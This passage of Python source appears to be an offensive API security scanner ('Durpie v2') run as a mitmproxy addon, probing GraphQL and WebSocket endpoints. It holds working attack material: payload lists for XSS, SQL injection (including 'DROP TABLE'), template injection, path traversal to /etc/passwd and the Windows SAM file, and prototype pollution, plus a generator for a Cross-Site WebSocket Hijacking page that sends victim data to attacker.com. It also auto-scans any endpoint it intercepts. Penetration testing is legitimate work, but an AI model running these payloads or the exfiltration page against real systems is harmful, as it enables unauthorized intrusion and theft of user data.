    # ------------------------------------------------------------------
    # 4. Field Suggestion Brute Force
    # ------------------------------------------------------------------

    async def test_field_suggestions(self, url: str) -> List[Finding]:
        """
        Exploit GraphQL's "Did you mean X?" error messages.

        When you query a non-existent field, most GraphQL implementations
        return a helpful error: "Cannot query field 'passwrd'. Did you mean 'password'?"

        This leaks the real field names, revealing schema even when
        introspection is disabled.

        We probe with common sensitive field names to discover which
        ones actually exist in the schema.
        """
        findings = []
        discovered = []

        for field in self.SENSITIVE_FIELDS:
            # Misspell the field name slightly to trigger suggestions
            misspelled = field[:-1] if len(field) > 3 else field + "x"
            query = f"{{ user {{ {misspelled} }} }}"
            _, data = await self._gql_post(url, query)

            errors = data.get("errors", [])
            for error in errors:
                msg = str(error.get("message", ""))
                # Look for "Did you mean" suggestions
                suggestion_match = re.search(
                    r'Did you mean ["\']?(\w+)["\']?', msg, re.IGNORECASE
                )
                if suggestion_match:
                    suggested = suggestion_match.group(1)
                    if suggested.lower() in field.lower() or field.lower() in suggested.lower():
                        discovered.append(suggested)
                        self._log(f"Field discovered via suggestion: {suggested}")

        if discovered:
            f = Finding(
                type="GraphQL Field Disclosure via Error Suggestions",
                severity="LOW",
                url=url,
                detail=(
                    f"GraphQL error messages revealed {len(discovered)} field name(s) "
                    f"via 'Did you mean?' suggestions: {discovered}. "
                    "Disable field suggestions in production to prevent schema enumeration "
                    "when introspection is disabled."
                ),
                evidence=str(discovered),
                poc=(
                    "# Field suggestion probe:\n"
                    f"curl -X POST {url} \\\n"
                    "  -H 'Content-Type: application/json' \\\n"
                    "  -d '{\"query\": \"{ user { passwrd } }\"}'\n"
                    "# Look for 'Did you mean' in errors"
                ),
            )
            self._add(f)
            findings.append(f)

        return findings

    # ------------------------------------------------------------------
    # 5. Per-Field Authorization Bypass
    # ------------------------------------------------------------------

    async def test_field_auth(self, url: str,
                              unauthed_headers: Dict = None) -> List[Finding]:
        """
        Test whether sensitive fields enforce authorization.

        In GraphQL, object-level auth (can the user see this User type?) and
        field-level auth (can they see the password field of a User?) are
        separate concerns. Developers often forget field-level checks.

        We query sensitive fields directly — if we get data back instead of
        an authorization error, field-level auth is missing.
        """
        findings = []
        schema = self._schemas.get(url, {})
        headers = unauthed_headers or {}

        # Build target fields from schema (if available) + our known sensitive list
        schema_sensitive = []
        for t in schema.get("types", []):
            for fld in (t.get("fields") or []):
                if any(s in fld["name"].lower() for s in
                       ["password", "secret", "token", "key", "ssn", "card"]):
                    schema_sensitive.append((t["name"], fld["name"]))

        # Try each sensitive field combination
        to_test = schema_sensitive[:10] or [("User", f) for f in self.SENSITIVE_FIELDS[:8]]

        for type_name, field_name in to_test:
            query = f"{{ {type_name.lower()} {{ id {field_name} }} }}"
            status, data = await self._gql_post(url, query, headers=headers)

            if status == 0:
                continue

            errors = data.get("errors", [])
            result = (data.get("data") or {}).get(type_name.lower(), {})

            # If the field is present in the response with a non-null value, it leaked
            if result and field_name in result and result[field_name] is not None:
                f = Finding(
                    type="GraphQL Field-Level Authorization Missing",
                    severity="HIGH",
                    url=url,
                    detail=(
                        f"Sensitive field '{type_name}.{field_name}' returned data "
                        "without proper authorization check. "
                        "GraphQL resolvers must enforce field-level access control "
                        "independently from object-level auth."
                    ),
                    parameter=f"{type_name}.{field_name}",
                    payload=query,
                    poc=(
                        f"# Query sensitive field without full authorization:\n"
                        f"curl -X POST {url} \\\n"
                        "  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"query\": \"{query}\"}}'"
                    ),
                )
                findings.append(f)
                self._add(f)

        return findings

    # ------------------------------------------------------------------
    # Main scan entry point
    # ------------------------------------------------------------------

    async def scan(self, url: str, headers: Dict = None) -> List[Finding]:
        """Run all GraphQL tests against a detected endpoint."""
        if url in self._tested:
            return []
        self._tested.add(url)
        self._log(f"Scanning GraphQL endpoint: {url}")

        if headers:
            self.client.default_headers.update(headers)

        await self.test_introspection(url)
        await self.test_depth_attack(url)
        await self.test_batch_attack(url)
        await self.test_field_suggestions(url)
        await self.test_field_auth(url)

        return self.findings

    # ---- mitmproxy addon hooks ----

    def request(self, flow: "http.HTTPFlow"):
        """Detect GraphQL traffic and mark endpoint for scanning."""
        body = flow.request.get_text()
        url = flow.request.pretty_url
        ct = flow.request.headers.get("content-type", "").lower()

        is_gql = any([
            "graphql" in url.lower(),
            '"query"' in body and "application/json" in ct,
            "__schema" in body or "__typename" in body,
        ])
        if is_gql and url not in self._gql_endpoints:
            self._gql_endpoints.add(url)
            self._log(f"GraphQL endpoint detected: {url}")
            hdrs = dict(flow.request.headers)
            asyncio.ensure_future(self.scan(url, hdrs))

    def response(self, flow: "http.HTTPFlow"):
        """Check GraphQL responses for detailed error leakage."""
        if not flow.response or flow.request.pretty_url not in self._gql_endpoints:
            return
        try:
            data = json.loads(flow.response.get_text())
        except Exception:
            return

        for error in data.get("errors", []):
            msg = str(error.get("message", ""))
            if any(kw in msg.lower() for kw in ["stack", "trace", "exception",
                                                  "at line", "syntax error"]):
                self._add(Finding(
                    type="GraphQL Verbose Error Leakage",
                    severity="LOW",
                    url=flow.request.pretty_url,
                    detail=(
                        "GraphQL error contains stack trace or internal details. "
                        "Disable detailed error messages in production."
                    ),
                    evidence=msg[:200],
                ))


# ============================================================
# WEBSOCKET TESTER
# ============================================================

class WebSocketTester:
    """
    WebSocket Security Tester.

    WebSocket-specific risks:
        - Cross-Site WebSocket Hijacking (CSWSH): Unlike HTTP, WebSocket
          upgrades include cookies but browsers don't enforce SOP on the
          handshake. A malicious page can open a WS connection to target.com
          using the victim's cookies — if the server doesn't validate the
          Origin header, it's hijackable.
        - Missing authentication: WS connections established after login
          may lose auth context if state isn't maintained properly.
        - Message injection: No built-in sanitisation on WS messages.
          If messages are reflected to other clients, XSS/injection is possible.
        - Protocol confusion: Switching sub-protocols can sometimes bypass
          security controls.

    Tests:
        1. CSWSH detection (missing/weak Origin validation)
        2. Upgrade request security (missing auth headers, insecure origin)
        3. Message injection payloads
        4. Sub-protocol confusion
    """

    # Injection payloads to test in WebSocket messages
    # Same categories as HTTP testing but adapted for WS message context
    WS_INJECTION_PAYLOADS = {
        "xss": [
            '<script>alert("DURPIE_WS_XSS")</script>',
            '<img src=x onerror=alert("DURPIE_WS_XSS")>',
            '{"message": "<script>alert(1)</script>"}',
        ],
        "sqli": [
            "' OR '1'='1",
            '" OR "1"="1',
            "1; DROP TABLE messages--",
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
        "prototype_pollution": [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
        ],
    }

    # Malicious origins to try during CSWSH testing
    CSWSH_ORIGINS = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://target.com.evil.com",
    ]

    def __init__(self):
        self.findings: List[Finding] = []
        self._ws_upgrades: Dict[str, Dict] = {}   # url → upgrade request info
        self._ws_messages: Dict[str, List] = {}   # url → messages seen

    def _log(self, msg: str):  _mlog("WebSocket", msg)
    def _warn(self, msg: str): _mlog("WebSocket", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def request(self, flow: "http.HTTPFlow"):
        """Detect WebSocket upgrade requests and analyse their security."""
        if flow.request.headers.get("Upgrade", "").lower() != "websocket":
            return

        url = flow.request.pretty_url
        ws_url = url.replace("https://", "wss://").replace("http://", "ws://")
        self._log(f"WebSocket upgrade detected: {ws_url}")

        origin = flow.request.headers.get("Origin", "")
        host = flow.request.host
        cookies = flow.request.headers.get("Cookie", "")

        self._ws_upgrades[ws_url] = {
            "url": ws_url,
            "http_url": url,
            "origin": origin,
            "host": host,
            "headers": dict(flow.request.headers),
            "has_cookies": bool(cookies),
        }

        # ---- Check 1: No Origin header ----
        if not origin:
            self._add(Finding(
                type="WebSocket Upgrade Missing Origin Header",
                severity="LOW",
                url=ws_url,
                detail=(
                    "WebSocket upgrade request has no Origin header. "
                    "Servers should validate the Origin to prevent CSWSH. "
                    "However, Origin can be spoofed by non-browser clients — "
                    "server-side authentication is the primary defence."
                ),
            ))

        # ---- Check 2: Origin doesn't match Host (possible spoofing) ----
        if origin:
            origin_host = urllib.parse.urlparse(origin).netloc
            if origin_host and origin_host != host:
                self._add(Finding(
                    type="WebSocket Cross-Origin Upgrade",
                    severity="MEDIUM",
                    url=ws_url,
                    detail=(
                        f"WebSocket upgrade Origin ({origin!r}) doesn't match "
                        f"Host ({host!r}). If the server accepts this, cross-origin "
                        "WebSocket connections are possible (CSWSH risk)."
                    ),
                    evidence=f"Origin={origin}, Host={host}",
                ))

        # ---- Check 3: No authentication on the upgrade ----
        auth_header = flow.request.headers.get("Authorization", "")
        if not auth_header and not cookies:
            self._add(Finding(
                type="WebSocket Upgrade Without Authentication",
                severity="MEDIUM",
                url=ws_url,
                detail=(
                    "WebSocket upgrade has no Authorization header or session cookies. "
                    "If this endpoint exposes user-specific data, authentication "
                    "must be established before or during the upgrade handshake."
                ),
            ))

        # ---- Advisory: CSWSH PoC ----
        self._add(Finding(
            type="Cross-Site WebSocket Hijacking (CSWSH) - Test Required",
            severity="MEDIUM",
            url=ws_url,
            detail=(
                "WebSocket endpoint identified. Test whether the server validates "
                "the Origin header. If not, an attacker can open a WS connection "
                "from any origin using the victim's cookies (CSWSH)."
            ),
            poc=self._cswsh_poc(ws_url, cookies),
        ))

    def _cswsh_poc(self, ws_url: str, cookies: str) -> str:
        """Generate an HTML PoC page for Cross-Site WebSocket Hijacking."""
        return f"""<!-- CSWSH PoC - host on attacker.com and lure victim to this page -->
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>CSWSH Proof of Concept</h1>
<pre id="output"></pre>
<script>
// The browser will automatically send the victim's cookies
// because this is a credentialed WebSocket connection.
var ws = new WebSocket("{ws_url}");

ws.onopen = function() {{
  document.getElementById("output").textContent += "[+] Connection opened\\n";
  // Optionally send messages to interact with the WS app
  ws.send(JSON.stringify({{action: "getProfile"}}));
}};

ws.onmessage = function(evt) {{
  // Exfiltrate data to attacker server
  document.getElementById("output").textContent += "[+] Data: " + evt.data + "\\n";
  fetch("https://attacker.com/exfil?d=" + encodeURIComponent(evt.data));
}};

ws.onerror = function(e) {{
  document.getElementById("output").textContent += "[-] Error (Origin rejected?)\\n";
}};
</script>
</body>
</html>
"""

    def websocket_message(self, flow: "http.HTTPFlow"):
        """
        Intercept WebSocket messages and analyse for injection opportunities.

        In mitmproxy, this hook fires for each individual WS message
        (both client→server and server→client directions).
        """
        if not hasattr(flow, "messages") or not flow.messages:
            return

        ws_url = flow.request.pretty_url.replace("https://", "wss://").replace("http://", "ws://")
        msg = flow.messages[-1]  # most recent message
        content = msg.content.decode("utf-8", errors="replace") if isinstance(msg.content, bytes) else msg.content

        if ws_url not in self._ws_messages:
            self._ws_messages[ws_url] = []
        self._ws_messages[ws_url].append({
            "direction": "client→server" if msg.from_client else "server→client",
            "content": content[:500],
        })

        # Check server→client messages for XSS reflection
        if not msg.from_client:
            xss_sinks = ["<script", "onerror=", "onload=", "javascript:"]
            for sink in xss_sinks:
                if sink in content.lower():
                    self._add(Finding(
                        type="WebSocket XSS Sink in Server Message",
                        severity="HIGH",
                        url=ws_url,
                        detail=(
                            f"Server WebSocket message contains potential XSS sink: {sink!r}. "
                            "If this content is written to the DOM without sanitisation, "
                            "injecting via a client→server message may trigger XSS."
                        ),
                        evidence=content[:100],
                    ))

        # For client→server: generate injection payload suggestions
        if msg.from_client:
            try:
                parsed = json.loads(content)
                # Report injectable JSON keys for manual testing
                if isinstance(parsed, dict) and len(parsed) > 0:
                    injectable_keys = list(parsed.keys())[:5]
                    self._add(Finding(
                        type="WebSocket Message Injection Surface",
                        severity="INFO",
                        url=ws_url,
                        detail=(
                            f"Client→Server JSON message with fields {injectable_keys}. "
                            "Test each field for XSS, SQLi, path traversal, and prototype pollution."
                        ),
                        poc=self._injection_poc(ws_url, parsed),
                    ))
            except (json.JSONDecodeError, ValueError):
                pass  # Non-JSON message

    def _injection_poc(self, ws_url: str, original_msg: Dict) -> str:
        """Generate WebSocket message injection test payloads."""
        lines = [f"# WebSocket injection test for {ws_url}", "# Original message:"]
        lines.append(f"# {json.dumps(original_msg)}")
        lines.append("")
        lines.append("# Test payloads (replace values one at a time):")
        for category, payloads in self.WS_INJECTION_PAYLOADS.items():
            lines.append(f"\n# {category.upper()}:")
            for p in payloads[:2]:
                test_msg = {**original_msg}
                first_key = next(iter(test_msg))
                test_msg[first_key] = p
                lines.append(f"  {json.dumps(test_msg)}")
        return "\n".join(lines)

    def response(self, flow: "http.HTTPFlow"):
        """Check WebSocket upgrade response headers."""
        if not flow.response:
            return
        if flow.response.status_code != 101:  # 101 Switching Protocols
            return

        ws_url = flow.request.pretty_url.replace("https://", "wss://").replace("http://", "ws://")

        # Check for security headers that should be on the upgrade response
        sec_ws_protocol = flow.response.headers.get("Sec-WebSocket-Protocol", "")
        if sec_ws_protocol:
            # Sub-protocol negotiation — may be exploitable for confusion attacks
            self._add(Finding(
                type="WebSocket Sub-Protocol Negotiated",
                severity="INFO",
                url=ws_url,
                detail=(
                    f"WebSocket sub-protocol negotiated: {sec_ws_protocol!r}. "
                    "Try requesting alternative sub-protocols — some implementations "
                    "apply different security controls per protocol."
                ),
                evidence=f"Sec-WebSocket-Protocol: {sec_ws_protocol}",
                poc=(
                    "# Sub-protocol confusion test:\n"
                    f"# Try connecting with a different sub-protocol:\n"
                    f"websocat '{ws_url}' --protocol chat\n"
                    f"websocat '{ws_url}' --protocol admin"
                ),
            ))


# ============================================================
# COMBINED ADDON
# ============================================================

class APITestingSuite:
    """
    Combined Phase 4 API testing suite.

    Loads all API scanners as a single mitmproxy addon:
    - RESTAPIScanner
    - GraphQLScanner
    - WebSocketTester

    Usage:
        mitmdump -s api_testing.py
    """

    def __init__(self):
        client = HTTPClient(rate_limit=0.15)
        self.rest = RESTAPIScanner(client=client)
        self.graphql = GraphQLScanner(client=client)
        self.ws = WebSocketTester()
        self.all_findings: List[Finding] = []

    def running(self):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info("[APITesting] Phase 4 API scanners initialized")
            ctx.log.info("[APITesting] REST + GraphQL + WebSocket testing enabled")

    def request(self, flow: "http.HTTPFlow"):
        self.graphql.request(flow)
        self.ws.request(flow)

    def response(self, flow: "http.HTTPFlow"):
        self.rest.response(flow)
        self.graphql.response(flow)
        self.ws.response(flow)

    def websocket_message(self, flow: "http.HTTPFlow"):
        self.ws.websocket_message(flow)

    def done(self):
        all_findings = self.rest.findings + self.graphql.findings + self.ws.findings
        if not all_findings:
            return
        output = [f.to_dict() for f in all_findings]
        filename = f"durpie_api_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, "w") as fh:
                json.dump(output, fh, indent=2)
            msg = f"[APITesting] {len(output)} findings saved to {filename}"
            if MITMPROXY_AVAILABLE and ctx:
                ctx.log.info(msg)
            else:
                print(msg)
        except OSError as e:
            print(f"[APITesting] Failed to save findings: {e}")


# ============================================================
# MITMPROXY ADDONS LIST
# ============================================================

addons = [
    APITestingSuite(),
]


# ============================================================
# STANDALONE DEMO
# ============================================================

if __name__ == "__main__":
    import sys

    print("""
Durpie v2 - API Security Testing (Phase 4)
==========================================
Modules:
  - RESTAPIScanner  : Endpoint discovery, method testing, HPP,
                      mass assignment, rate limit, API versioning
  - GraphQLScanner  : Introspection, schema extraction, depth/batch DoS,
                      field suggestion disclosure, per-field auth bypass
  - WebSocketTester : CSWSH detection, Origin validation, message injection,
                      sub-protocol confusion

Usage as mitmproxy addon:
  mitmdump -s api_testing.py

Standalone REST scan:
  python api_testing.py rest https://api.target.com/v1/users/1

Standalone GraphQL scan:
  python api_testing.py graphql https://api.target.com/graphql
""")

    if len(sys.argv) >= 3:
        mode = sys.argv[1]
        target = sys.argv[2]

        async def _demo():
            client = HTTPClient(rate_limit=0.3)
            if mode == "graphql":
                scanner = GraphQLScanner(client=client)
                findings = await scanner.scan(target)
            else:
                scanner = RESTAPIScanner(client=client)
                findings = await scanner.scan(target)
            print(f"\n[+] {len(findings)} findings:\n")
            for f in findings:
                print(f"  {f}")
                if f.poc:
                    print(f"  PoC:\n{f.poc}\n")

        asyncio.run(_demo())
